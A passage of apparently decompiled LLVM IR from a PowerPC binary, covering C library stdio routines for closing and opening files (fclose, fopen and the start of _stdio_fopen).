  ret i32 %v0_1000df9c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 35, 36, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_1000df8c, { 2, 0, 1 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000dfa0 = load i32, i32* @lr, align 4
  store i32 %v0_1000dfa0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000dfb4 = add i32 %tmp, 52
  %v3_1000dfb4 = inttoptr i32 %v2_1000dfb4 to i32*
  %v4_1000dfb4 = load i32, i32* %v3_1000dfb4, align 4
  store i32 %v4_1000dfb4, i32* @r28, align 4
  %v3_1000dfb8 = icmp eq i32 %v4_1000dfb4, 0
  store i1 %v3_1000dfb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dfb8, label %dec_label_pc_1000dfc0, label %dec_label_pc_1000e00c

dec_label_pc_1000dfc0:                            ; preds = %entry
  %v2_1000dfc0 = add i32 %tmp, 64
  %v3_1000dfc0 = inttoptr i32 %v2_1000dfc0 to i32*
  %v4_1000dfc0 = load i32, i32* %v3_1000dfc0, align 4
  store i32 %v4_1000dfc0, i32* %r0.global-to-local, align 4
  %v0_1000dfc4 = load i32, i32* @r2, align 4
  %v1_1000dfc4 = add i32 %v0_1000dfc4, -29808
  store i32 %v1_1000dfc4, i32* %r30.global-to-local, align 4
  %v4_1000dfc8 = icmp eq i32 %v4_1000dfc0, %v1_1000dfc4
  store i1 %v4_1000dfc8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000dfc8, label %dec_label_pc_1000e000, label %dec_label_pc_1000dfd8

dec_label_pc_1000dfd8:                            ; preds = %dec_label_pc_1000dfc0
  %v2_1000dfd0 = add i32 %tmp, 56
  store i32 %v2_1000dfd0, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000dfdc = load i32, i32* @r9, align 4
  %v4_1000dfdc = icmp eq i32 %v0_1000dfdc, 0
  store i1 %v4_1000dfdc, i1* @cr0_eq, align 1
  store i1 %v4_1000dfdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000dfdc, label %dec_label_pc_1000dffc, label %dec_label_pc_1000dff8

dec_label_pc_1000dff8:                            ; preds = %dec_label_pc_1000dfd8
  %v0_1000dff8 = call i32 @__lll_lock_wait_private()
  %v0_1000dffc.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_1000dffc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000dffc

dec_label_pc_1000dffc:                            ; preds = %dec_label_pc_1000dfd8, %dec_label_pc_1000dff8
  %v1_1000dffc = phi i32 [ %tmp, %dec_label_pc_1000dfd8 ], [ %v1_1000dffc.pre, %dec_label_pc_1000dff8 ]
  %v0_1000dffc = phi i32 [ %v1_1000dfc4, %dec_label_pc_1000dfd8 ], [ %v0_1000dffc.pre, %dec_label_pc_1000dff8 ]
  %v2_1000dffc = add i32 %v1_1000dffc, 64
  %v3_1000dffc = inttoptr i32 %v2_1000dffc to i32*
  store i32 %v0_1000dffc, i32* %v3_1000dffc, align 4
  %v0_1000e000.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e000

dec_label_pc_1000e000:                            ; preds = %dec_label_pc_1000dfc0, %dec_label_pc_1000dffc
  %v0_1000e000 = phi i32 [ %tmp, %dec_label_pc_1000dfc0 ], [ %v0_1000e000.pre, %dec_label_pc_1000dffc ]
  %v1_1000e000 = add i32 %v0_1000e000, 60
  %v2_1000e000 = inttoptr i32 %v1_1000e000 to i32*
  %v3_1000e000 = load i32, i32* %v2_1000e000, align 4
  %v1_1000e004 = add i32 %v3_1000e000, 1
  store i32 %v1_1000e004, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e004, i32* %v2_1000e000, align 4
  %v0_1000e00c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e00c

dec_label_pc_1000e00c:                            ; preds = %entry, %dec_label_pc_1000e000
  %v0_1000e01c = phi i32 [ %tmp, %entry ], [ %v0_1000e00c.pre, %dec_label_pc_1000e000 ]
  %v1_1000e00c = inttoptr i32 %v0_1000e01c to i16*
  %v2_1000e00c = load i16, i16* %v1_1000e00c, align 2
  %v3_1000e00c = zext i16 %v2_1000e00c to i32
  store i32 %v3_1000e00c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  %v1_1000e014 = and i32 %v3_1000e00c, 64
  store i32 %v1_1000e014, i32* %r9.global-to-local, align 4
  %v3_1000e014 = icmp eq i32 %v1_1000e014, 0
  store i1 %v3_1000e014, i1* @cr0_eq, align 1
  br i1 %v3_1000e014, label %dec_label_pc_1000e028, label %dec_label_pc_1000e01c

dec_label_pc_1000e01c:                            ; preds = %dec_label_pc_1000e00c
  store i32 268492836, i32* @lr, align 4
  %v4_1000e020 = call i32 @fflush_unlocked(i16* %v1_1000e00c, i32 %v1_1000e014)
  store i32 %v4_1000e020, i32* %r27.global-to-local, align 4
  %v0_1000e028.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e028

dec_label_pc_1000e028:                            ; preds = %dec_label_pc_1000e00c, %dec_label_pc_1000e01c
  %v0_1000e028 = phi i32 [ %v0_1000e01c, %dec_label_pc_1000e00c ], [ %v0_1000e028.pre, %dec_label_pc_1000e01c ]
  %v1_1000e028 = add i32 %v0_1000e028, 4
  %v2_1000e028 = inttoptr i32 %v1_1000e028 to i32*
  %v3_1000e028 = load i32, i32* %v2_1000e028, align 4
  store i32 %v3_1000e028, i32* @r3, align 4
  %v0_1000e02c = call i32 @__GI___libc_close()
  %v3_1000e030 = icmp eq i32 %v0_1000e02c, 0
  store i1 %v3_1000e030, i1* %cr7_eq.global-to-local, align 1
  %tmp10 = icmp sgt i32 %v0_1000e02c, -1
  br i1 %tmp10, label %dec_label_pc_1000e03c, label %dec_label_pc_1000e038

dec_label_pc_1000e038:                            ; preds = %dec_label_pc_1000e028
  store i32 -1, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000e03c

dec_label_pc_1000e03c:                            ; preds = %dec_label_pc_1000e028, %dec_label_pc_1000e038
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000e040 = load i32, i32* @r2, align 4
  %v1_1000e040 = add i32 %v0_1000e040, -29808
  store i32 %v1_1000e040, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* %r30.global-to-local, align 4
  %v3_1000e048 = load i32, i32* @global_var_100212e4.563, align 4
  %v4_1000e04c = icmp eq i32 %v3_1000e048, %v1_1000e040
  store i1 %v4_1000e04c, i1* %cr7_eq.global-to-local, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000e054 = load i32, i32* @r31, align 4
  %v2_1000e054 = add i32 %v1_1000e054, 4
  %v3_1000e054 = inttoptr i32 %v2_1000e054 to i32*
  store i32 -1, i32* %v3_1000e054, align 4
  br i1 %v4_1000e04c, label %dec_label_pc_1000e090, label %dec_label_pc_1000e064

dec_label_pc_1000e064:                            ; preds = %dec_label_pc_1000e03c
  store i32 0, i32* @r9, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000e068 = load i32, i32* @r11, align 4
  %v4_1000e068 = icmp eq i32 %v0_1000e068, 0
  store i1 %v4_1000e068, i1* @cr0_eq, align 1
  store i1 %v4_1000e068, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000e068, label %dec_label_pc_1000e08c, label %dec_label_pc_1000e084

dec_label_pc_1000e084:                            ; preds = %dec_label_pc_1000e064
  %v0_1000e084 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e084, i32* @r3, align 4
  %v0_1000e088 = call i32 @__lll_lock_wait_private()
  br label %dec_label_pc_1000e08c

dec_label_pc_1000e08c:                            ; preds = %dec_label_pc_1000e064, %dec_label_pc_1000e084
  %v0_1000e08c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e08c, i32* @global_var_100212e4.563, align 4
  br label %dec_label_pc_1000e090

dec_label_pc_1000e090:                            ; preds = %dec_label_pc_1000e03c, %dec_label_pc_1000e08c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e09c = load i32, i32* @global_var_10021244.564, align 4
  %v3_1000e0a0 = load i32, i32* @global_var_100212e0.565, align 4
  store i32 %v3_1000e0a0, i32* %r0.global-to-local, align 4
  %v1_1000e0a4 = add i32 %v3_1000e09c, 1
  %v3_1000e0a8 = icmp eq i32 %v3_1000e0a0, 0
  store i1 %v3_1000e0a8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000e0a4, i32* @global_var_10021244.564, align 4
  br i1 %v3_1000e0a8, label %dec_label_pc_1000e0b4, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0b4:                            ; preds = %dec_label_pc_1000e090
  store i32 0, i32* @global_var_100212e4.563, align 4
  %v0_1000e0c4.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e0bc

dec_label_pc_1000e0bc:                            ; preds = %dec_label_pc_1000e0bc, %dec_label_pc_1000e0b4
  %v0_1000e0c4 = phi i1 [ false, %dec_label_pc_1000e0bc ], [ %v0_1000e0c4.pr, %dec_label_pc_1000e0b4 ]
  br i1 %v0_1000e0c4, label %dec_label_pc_1000e0d0, label %dec_label_pc_1000e0bc

dec_label_pc_1000e0d0:                            ; preds = %dec_label_pc_1000e0bc
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000e0e4 = call i32 @__asm_mfcr()
  store i32 %v0_1000e0e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e0e8

dec_label_pc_1000e0e8:                            ; preds = %dec_label_pc_1000e090, %dec_label_pc_1000e0d0
  %v0_1000e0e8 = load i32, i32* @r31, align 4
  %v1_1000e0e8 = inttoptr i32 %v0_1000e0e8 to i16*
  %v2_1000e0e8 = load i16, i16* %v1_1000e0e8, align 2
  %v3_1000e0e8 = zext i16 %v2_1000e0e8 to i32
  store i32 %v3_1000e0e8, i32* %r0.global-to-local, align 4
  %v0_1000e0ec = load i32, i32* @r28, align 4
  %v3_1000e0ec = icmp eq i32 %v0_1000e0ec, 0
  store i1 %v3_1000e0ec, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e0f0 = call i32 @__asm_rlwinm(i32 %v3_1000e0e8, i32 0, i32 17, i32 18)
  %v1_1000e0f4 = or i32 %v1_1000e0f0, 48
  store i32 %v1_1000e0f4, i32* %r0.global-to-local, align 4
  %v1_1000e0f8 = trunc i32 %v1_1000e0f4 to i16
  %v2_1000e0f8 = load i32, i32* @r31, align 4
  %v3_1000e0f8 = inttoptr i32 %v2_1000e0f8 to i16*
  store i16 %v1_1000e0f8, i16* %v3_1000e0f8, align 2
  %v0_1000e0fc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e0fc, label %dec_label_pc_1000e100, label %dec_label_pc_1000e14c

dec_label_pc_1000e100:                            ; preds = %dec_label_pc_1000e0e8
  %v0_1000e100 = load i32, i32* @r31, align 4
  %v1_1000e100 = add i32 %v0_1000e100, 60
  %v2_1000e100 = inttoptr i32 %v1_1000e100 to i32*
  %v3_1000e100 = load i32, i32* %v2_1000e100, align 4
  %v1_1000e104 = add i32 %v3_1000e100, -1
  store i32 %v1_1000e104, i32* %r9.global-to-local, align 4
  %v3_1000e108 = icmp eq i32 %v1_1000e104, 0
  store i1 %v3_1000e108, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000e104, i32* %v2_1000e100, align 4
  br i1 %v3_1000e108, label %dec_label_pc_1000e114, label %dec_label_pc_1000e14c

dec_label_pc_1000e114:                            ; preds = %dec_label_pc_1000e100
  %v0_1000e114 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e114 = load i32, i32* @r31, align 4
  %v2_1000e114 = add i32 %v1_1000e114, 64
  %v3_1000e114 = inttoptr i32 %v2_1000e114 to i32*
  store i32 %v0_1000e114, i32* %v3_1000e114, align 4
  %v0_1000e128.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e120

dec_label_pc_1000e120:                            ; preds = %dec_label_pc_1000e120, %dec_label_pc_1000e114
  %v0_1000e128 = phi i1 [ false, %dec_label_pc_1000e120 ], [ %v0_1000e128.pr, %dec_label_pc_1000e114 ]
  br i1 %v0_1000e128, label %dec_label_pc_1000e12c, label %dec_label_pc_1000e120

dec_label_pc_1000e12c:                            ; preds = %dec_label_pc_1000e120
  %v0_1000e12c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e12c = icmp eq i32 %v0_1000e12c, 1
  store i1 %v3_1000e12c, i1* %cr7_eq.global-to-local, align 1
  %tmp11 = icmp slt i32 %v0_1000e12c, 2
  br i1 %tmp11, label %dec_label_pc_1000e14c, label %dec_label_pc_1000e134

dec_label_pc_1000e134:                            ; preds = %dec_label_pc_1000e12c
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000e148 = call i32 @__asm_mfcr()
  store i32 %v0_1000e148, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e14c

dec_label_pc_1000e14c:                            ; preds = %dec_label_pc_1000e100, %dec_label_pc_1000e0e8, %dec_label_pc_1000e12c, %dec_label_pc_1000e134
  %v0_1000e14c = load i32, i32* @r31, align 4
  %v1_1000e14c = inttoptr i32 %v0_1000e14c to i16*
  %v2_1000e14c = load i16, i16* %v1_1000e14c, align 2
  %v3_1000e14c = zext i16 %v2_1000e14c to i32
  store i32 %v3_1000e14c, i32* %r0.global-to-local, align 4
  %v1_1000e150 = and i32 %v3_1000e14c, 16384
  store i32 %v1_1000e150, i32* @r11, align 4
  %v3_1000e150 = icmp eq i32 %v1_1000e150, 0
  store i1 %v3_1000e150, i1* @cr0_eq, align 1
  br i1 %v3_1000e150, label %dec_label_pc_1000e160, label %dec_label_pc_1000e158

dec_label_pc_1000e158:                            ; preds = %dec_label_pc_1000e14c
  %v1_1000e158 = add i32 %v0_1000e14c, 8
  %v2_1000e158 = inttoptr i32 %v1_1000e158 to i32*
  %v3_1000e158 = load i32, i32* %v2_1000e158, align 4
  store i32 %v3_1000e158, i32* @r3, align 4
  store i32 268493152, i32* @lr, align 4
  %v0_1000e15c = call i32 @free()
  br label %dec_label_pc_1000e160

dec_label_pc_1000e160:                            ; preds = %dec_label_pc_1000e14c, %dec_label_pc_1000e158
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000e164 = load i32, i32* @r2, align 4
  %v1_1000e164 = add i32 %v0_1000e164, -29808
  store i32 %v1_1000e164, i32* %r30.global-to-local, align 4
  %v3_1000e16c = load i32, i32* @global_var_100212e4.563, align 4
  store i32 %v3_1000e16c, i32* %r0.global-to-local, align 4
  %v4_1000e170 = icmp eq i32 %v3_1000e16c, %v1_1000e164
  store i1 %v4_1000e170, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000e170, label %dec_label_pc_1000e1ac, label %dec_label_pc_1000e180

dec_label_pc_1000e180:                            ; preds = %dec_label_pc_1000e160
  store i32 0, i32* @r9, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000e184 = load i32, i32* @r11, align 4
  %v4_1000e184 = icmp eq i32 %v0_1000e184, 0
  store i1 %v4_1000e184, i1* @cr0_eq, align 1
  store i1 %v4_1000e184, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000e184, label %dec_label_pc_1000e1a8, label %dec_label_pc_1000e1a0

dec_label_pc_1000e1a0:                            ; preds = %dec_label_pc_1000e180
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* @r3, align 4
  %v0_1000e1a4 = call i32 @__lll_lock_wait_private()
  %v0_1000e1a8.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e1a8

dec_label_pc_1000e1a8:                            ; preds = %dec_label_pc_1000e180, %dec_label_pc_1000e1a0
  %v0_1000e1a8 = phi i32 [ %v1_1000e164, %dec_label_pc_1000e180 ], [ %v0_1000e1a8.pre, %dec_label_pc_1000e1a0 ]
  store i32 %v0_1000e1a8, i32* @global_var_100212e4.563, align 4
  br label %dec_label_pc_1000e1ac

dec_label_pc_1000e1ac:                            ; preds = %dec_label_pc_1000e160, %dec_label_pc_1000e1a8
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e1b8 = load i32, i32* @global_var_10021248.566, align 4
  %v3_1000e1bc = load i32, i32* @global_var_100212e0.565, align 4
  store i32 %v3_1000e1bc, i32* %r0.global-to-local, align 4
  %v1_1000e1c0 = add i32 %v3_1000e1b8, 1
  store i32 %v1_1000e1c0, i32* @r11, align 4
  %v3_1000e1c4 = icmp eq i32 %v3_1000e1bc, 0
  store i1 %v3_1000e1c4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000e1c0, i32* @global_var_10021248.566, align 4
  br i1 %v3_1000e1c4, label %dec_label_pc_1000e1d0, label %dec_label_pc_1000e204

dec_label_pc_1000e1d0:                            ; preds = %dec_label_pc_1000e1ac
  store i32 0, i32* @global_var_100212e4.563, align 4
  %v0_1000e1e0.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e1d8

dec_label_pc_1000e1d8:                            ; preds = %dec_label_pc_1000e1d8, %dec_label_pc_1000e1d0
  %v0_1000e1e0 = phi i1 [ false, %dec_label_pc_1000e1d8 ], [ %v0_1000e1e0.pr, %dec_label_pc_1000e1d0 ]
  br i1 %v0_1000e1e0, label %dec_label_pc_1000e1ec, label %dec_label_pc_1000e1d8

dec_label_pc_1000e1ec:                            ; preds = %dec_label_pc_1000e1d8
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000e200 = call i32 @__asm_mfcr()
  store i32 %v0_1000e200, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e204

dec_label_pc_1000e204:                            ; preds = %dec_label_pc_1000e1ac, %dec_label_pc_1000e1ec
  store i32 268493320, i32* @lr, align 4
  %v0_1000e204 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_1000dfa0, i32* %r0.global-to-local, align 4
  %v0_1000e20c = load i32, i32* %r27.global-to-local, align 4
  ret i32 %v0_1000e20c

; uselistorder directives
  uselistorder i1 %v4_1000e184, { 1, 0, 2 }
  uselistorder i1 %v4_1000e068, { 1, 0, 2 }
  uselistorder i1 %v4_1000dfdc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %r27.global-to-local, { 2, 0, 3, 1 }
  uselistorder i32 17, { 27, 0, 25, 26, 4, 5, 1, 11, 12, 13, 14, 6, 15, 7, 16, 8, 17, 18, 19, 9, 2, 20, 3, 21, 10, 22, 23, 24 }
  uselistorder i32 ()* @__GI___libc_close, { 0, 32, 36, 31, 35, 30, 34, 29, 28, 33, 27, 26, 25, 24, 10, 9, 8, 7, 6, 5, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_1000e204, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e160, { 1, 0 }
  uselistorder label %dec_label_pc_1000e14c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e0e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e090, { 1, 0 }
  uselistorder label %dec_label_pc_1000e08c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e03c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e028, { 1, 0 }
  uselistorder label %dec_label_pc_1000e00c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e000, { 1, 0 }
  uselistorder label %dec_label_pc_1000dffc, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_1000e228 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_1000e228
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e22c = load i32, i32* @lr, align 4
  store i32 %v0_1000e22c, i32* %r0.global-to-local, align 4
  %v0_1000e240 = load i32, i32* @r5, align 4
  store i32 %v0_1000e240, i32* @r31, align 4
  %v0_1000e244 = load i32, i32* @r6, align 4
  store i32 %v0_1000e244, i32* @r29, align 4
  %v3_1000e248 = load i8, i8* %arg2, align 1
  %v4_1000e248 = zext i8 %v3_1000e248 to i32
  store i32 %v4_1000e248, i32* %r0.global-to-local, align 4
  %v3_1000e24c = icmp eq i8 %v3_1000e248, 114
  store i1 %v3_1000e24c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e24c, label %dec_label_pc_1000e2a4, label %dec_label_pc_1000e254

dec_label_pc_1000e254:                            ; preds = %entry
  %v3_1000e254 = icmp eq i8 %v3_1000e248, 119
  store i1 %v3_1000e254, i1* %cr7_eq.global-to-local, align 1
  store i32 577, i32* @r30, align 4
  br i1 %v3_1000e254, label %dec_label_pc_1000e2a8, label %dec_label_pc_1000e260

dec_label_pc_1000e260:                            ; preds = %dec_label_pc_1000e254
  %v3_1000e260 = icmp eq i8 %v3_1000e248, 97
  store i1 %v3_1000e260, i1* %cr7_eq.global-to-local, align 1
  store i32 1089, i32* @r30, align 4
  br i1 %v3_1000e260, label %dec_label_pc_1000e2a8, label %dec_label_pc_1000e26c

dec_label_pc_1000e26c:                            ; preds = %dec_label_pc_1000e350, %dec_label_pc_1000e320, %dec_label_pc_1000e260
  %v0_1000e270 = load i32, i32* @r31, align 4
  %v3_1000e270 = icmp eq i32 %v0_1000e270, 0
  store i1 %v3_1000e270, i1* %cr7_eq.global-to-local, align 1
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_1000e27c = load i32, i32* @r2, align 4
  %v1_1000e280 = add i32 %v0_1000e27c, -28672
  store i32 %v1_1000e280, i32* @r9, align 4
  %v2_1000e284 = inttoptr i32 %v1_1000e280 to i32*
  store i32 22, i32* %v2_1000e284, align 4
  br i1 %v3_1000e270, label %dec_label_pc_1000e5f8, label %dec_label_pc_1000e28c

dec_label_pc_1000e28c:                            ; preds = %dec_label_pc_1000e384, %dec_label_pc_1000e26c
  %v0_1000e28c = load i32, i32* @r31, align 4
  %v1_1000e28c = inttoptr i32 %v0_1000e28c to i16*
  %v2_1000e28c = load i16, i16* %v1_1000e28c, align 2
  %v3_1000e28c = zext i16 %v2_1000e28c to i32
  store i32 %v3_1000e28c, i32* %r0.global-to-local, align 4
  %v1_1000e290 = and i32 %v3_1000e28c, 8192
  store i32 %v1_1000e290, i32* @r9, align 4
  %v3_1000e290 = icmp eq i32 %v1_1000e290, 0
  br i1 %v3_1000e290, label %dec_label_pc_1000e5f8, label %dec_label_pc_1000e298

dec_label_pc_1000e298:                            ; preds = %dec_label_pc_1000e28c
  store i32 %v0_1000e28c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000e2a0.567 to i32), i32* @lr, align 4
  %v0_1000e29c = call i32 @free()
  store i32 %v0_1000e29c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e5f8

dec_label_pc_1000e2a4:                            ; preds = %entry
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_1000e2a8

dec_label_pc_1000e2a8:                            ; preds = %dec_label_pc_1000e260, %dec_label_pc_1000e254, %dec_label_pc_1000e2a4
  %v0_1000e2c8 = phi i32 [ 1089, %dec_label_pc_1000e260 ], [ 577, %dec_label_pc_1000e254 ], [ 1, %dec_label_pc_1000e2a4 ]
  %v2_1000e2a8 = add i32 %tmp, 1
  %v3_1000e2a8 = inttoptr i32 %v2_1000e2a8 to i8*
  %v4_1000e2a8 = load i8, i8* %v3_1000e2a8, align 1
  %v5_1000e2a8 = zext i8 %v4_1000e2a8 to i32
  store i32 %v5_1000e2a8, i32* %r0.global-to-local, align 4
  store i32 %v2_1000e2a8, i32* %r9.global-to-local, align 4
  %v3_1000e2b0 = icmp eq i8 %v4_1000e2a8, 98
  store i1 %v3_1000e2b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e2b0, label %dec_label_pc_1000e2bc, label %dec_label_pc_1000e2b8

dec_label_pc_1000e2b8:                            ; preds = %dec_label_pc_1000e2a8
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2bc

dec_label_pc_1000e2bc:                            ; preds = %dec_label_pc_1000e2a8, %dec_label_pc_1000e2b8
  %v0_1000e2bc = phi i32 [ %v2_1000e2a8, %dec_label_pc_1000e2a8 ], [ %tmp, %dec_label_pc_1000e2b8 ]
  %v1_1000e2bc = add i32 %v0_1000e2bc, 1
  %v2_1000e2bc = inttoptr i32 %v1_1000e2bc to i8*
  %v3_1000e2bc = load i8, i8* %v2_1000e2bc, align 1
  %v4_1000e2bc = zext i8 %v3_1000e2bc to i32
  store i32 %v4_1000e2bc, i32* %r0.global-to-local, align 4
  %v3_1000e2c0 = icmp eq i8 %v3_1000e2bc, 43
  store i1 %v3_1000e2c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e2c0, label %dec_label_pc_1000e2c8, label %dec_label_pc_1000e2d0

dec_label_pc_1000e2c8:                            ; preds = %dec_label_pc_1000e2bc
  store i32 %v0_1000e2c8, i32* %r9.global-to-local, align 4
  %v1_1000e2cc = add nuw nsw i32 %v0_1000e2c8, 1
  store i32 %v1_1000e2cc, i32* @r30, align 4
  br label %dec_label_pc_1000e2d0

dec_label_pc_1000e2d0:                            ; preds = %dec_label_pc_1000e2bc, %dec_label_pc_1000e2c8
  %v3_1000e2d0 = icmp eq i32 %v0_1000e240, 0
  store i1 %v3_1000e2d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e2d0, label %dec_label_pc_1000e2d8, label %dec_label_pc_1000e318

dec_label_pc_1000e2d8:                            ; preds = %dec_label_pc_1000e2d0
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 268493536, i32* @lr, align 4
  %v1_1000e2dc = call i32 @malloc(i32 68)
  store i32 %v1_1000e2dc, i32* %r3.global-to-local, align 4
  store i32 %v1_1000e2dc, i32* @r31, align 4
  %v4_1000e2e0 = icmp eq i32 %v1_1000e2dc, 0
  br i1 %v4_1000e2e0, label %dec_label_pc_1000e5fc, label %dec_label_pc_1000e2e8

dec_label_pc_1000e2e8:                            ; preds = %dec_label_pc_1000e2d8
  %v3_1000e2f0 = inttoptr i32 %v1_1000e2dc to i16*
  store i16 8192, i16* %v3_1000e2f0, align 2
  %v2_1000e2f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e2f4, i32* @r11, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000e300 = load i32, i32* @r31, align 4
  %v2_1000e300 = add i32 %v1_1000e300, 8
  %v3_1000e300 = inttoptr i32 %v2_1000e300 to i32*
  store i32 0, i32* %v3_1000e300, align 4
  %v0_1000e30c = load i32, i32* @r31, align 4
  %v1_1000e30c = add i32 %v0_1000e30c, 56
  store i32 %v1_1000e30c, i32* %r9.global-to-local, align 4
  %v0_1000e318.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e318

dec_label_pc_1000e318:                            ; preds = %dec_label_pc_1000e2d0, %dec_label_pc_1000e2e8
  %v1_1000e32c = phi i32 [ %v0_1000e240, %dec_label_pc_1000e2d0 ], [ %v0_1000e30c, %dec_label_pc_1000e2e8 ]
  %v0_1000e378 = phi i32 [ %v0_1000e244, %dec_label_pc_1000e2d0 ], [ %v0_1000e318.pre, %dec_label_pc_1000e2e8 ]
  %v1_1000e318 = icmp slt i32 %v0_1000e378, 0
  %v3_1000e318 = icmp eq i32 %v0_1000e378, 0
  store i1 %v3_1000e318, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000e318, label %dec_label_pc_1000e378, label %dec_label_pc_1000e320

dec_label_pc_1000e320:                            ; preds = %dec_label_pc_1000e318
  %v1_1000e324 = add i32 %arg1, 1
  store i32 %v1_1000e324, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v2_1000e32c = add i32 %v1_1000e32c, 4
  %v3_1000e32c = inttoptr i32 %v2_1000e32c to i32*
  store i32 %v0_1000e378, i32* %v3_1000e32c, align 4
  %v0_1000e330 = load i32, i32* @r30, align 4
  %v1_1000e330 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000e330 = and i32 %v1_1000e330, %v0_1000e330
  %v1_1000e334 = add i32 %v2_1000e330, 1
  store i32 %v1_1000e334, i32* %r9.global-to-local, align 4
